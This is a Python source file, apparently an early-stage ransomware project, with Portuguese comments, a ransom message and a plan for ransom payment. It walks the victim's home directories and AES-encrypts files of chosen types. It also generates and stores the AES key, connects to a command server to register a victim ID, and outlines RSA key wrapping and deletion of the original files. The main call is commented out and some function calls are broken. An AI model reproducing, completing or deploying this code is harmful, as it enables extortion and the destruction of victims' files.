#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

import os
import socket
from random import choice
import multiprocessing

from criptografa_descriptografa_arquivo_AES import *
from rsa import *
from desc_rsa import *
'''

    COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
    O SERVIDOR ARMAZENA O ID E MANDA UMA CHAVE PARA CRIPTOGRAFAR
    MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
    MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
    IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU

'''




texto='''

    Bom dia, você foi vitma do Ransomware.

'''

# ponto de partida da criptografia
def menu():
    # caminho de partida
    home=os.environ['HOME']
    # lista com os tipos
    f=open('tipos_arquivos.txt','r')
    tipos=f.read()
    tipos=tipos.split('\n')
    # diretorios no caminho de partida
    diretorios=os.listdir(home)
    tam=len(diretorios)
    for a in range(tam):
        p=multiprocessing.Process(target=listar,args=(diretorios[a],tipos))
        p.start()
        #p.join() -> em ordem # espera um terminar para começar outro
    listar('/home/tarcisio/.android',tipos,1)
    # CRIAR UMA THREAD PARA CADA DIRETORIO
    # CADA THREAD LISTAR DIRETORIO
    #retorno=listar(home,tipos)


def listar(diretorio, tipos_arq, modo):
    if(modo==1): # criptografa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a=caminho+'/'+arq
                extensao=os.path.splitext(a)
                for ext in tipos_arq:
                    if(extensao[1]==ext):
                        a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                        criptografa(a)

    else: # descriptgrafa
        for caminho, diretorio, arquivo in os.walk(diretorio):
            for arq in arquivo:
                a=caminho+'/'+arq
                extensao=os.path.splitext(a)
                if(extensao[1]=='.cripto'):
                    a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                    descriptografa(a)


def client(IP_serv):

    porta=6064
    try:
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_obj.connect((IP_serv, porta))
    except socket.error as erro:
        print('Erro ocorrido: '+str(erro))
        return
    # conectado ao servidor
    print('enviando ID')
    mensagem='TESTE_ID'
    socket_obj.send(mensagem)
    #data = socket_obj.recv(1024) # recebeu do servidor a chave publica

def gera_chave_AES():
    # GERA SENHA AES que vai criptografar os arquivos
    # Salva senha em arquivo.txt
    tamanho=30
    caracters = '0123456789abcdefghijlmnopqrstuwvxz-/*&#@!=-.,'
    senha = ''
    for char in xrange(tamanho):
        senha += choice(caracters)

    try:
        f=open('keys/AES.txt','w')
    except IOError:
        os.mkdir('keys')
        f=open('keys/AES.txt','w')
    f.write(senha)
    f.close()
    return senha



# MAIN
AES_key=gera_chave_AES()
#print('[*] chave AES gerada')
#menu() # -> criptografa tudo

#AES_to_RSA()
#print('[*] chave AES criptografado com RSA keys')

#RSA_to_AES()

    # criptografa todos os arquivos com AES

    # criptografa a chave AES

    # criptografa a chave privada RSA


    ############### SE PAGAR #####################


    # descriptografa a chave privada (R) com a chave privada(S)

    # descriptografa a chave AES, com a chave privada (R)

    # descriptografa todos os arquivos com a chave AES
